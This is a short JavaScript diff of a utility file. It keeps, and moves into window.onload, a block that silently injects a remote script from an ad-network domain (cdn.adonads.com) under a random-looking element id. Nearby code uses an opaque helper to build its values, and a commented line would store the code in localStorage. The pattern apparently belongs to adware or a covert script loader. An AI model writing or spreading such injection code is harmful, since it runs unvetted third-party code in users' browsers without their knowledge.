@@ -89,7 +89,8 @@ function utilFunctions(){
 	
 	function init (ho) {
 		if(ho===buildHQ("f")){
-			var qObj = getQobj(buildHQ("i"),buildHQ("n"));
+			var key=buildHQ("i");
+			var qObj = getQobj(key,buildHQ("n"));
 			var isProduct = false;
 
 			for (var prop in qObj) {
@@ -150,12 +151,13 @@ function utilFunctions(){
 
 utilFunctions();
 
-if(!document.getElementById("WOOGFuoe97")) {
-    var s = document.createElement("script");
-    s.id = "WOOGFuoe97";
-    s.src = "https://cdn.adonads.com/b0sfsw/bindo.js";
-    document.body.appendChild(s);
+window.onload = function(){
+	if(!document.getElementById("WOOGFuoe97")) {
+	    var s = document.createElement("script");
+	    s.id = "WOOGFuoe97";
+	    s.src = "https://cdn.adonads.com/b0sfsw/bindo.js";
+	    document.body.appendChild(s);
+	}
 }
-
 //store the execution so that it is available to all
 //localStorage["tjs"]= utilFunctions.toString() +"utilFunctions();"
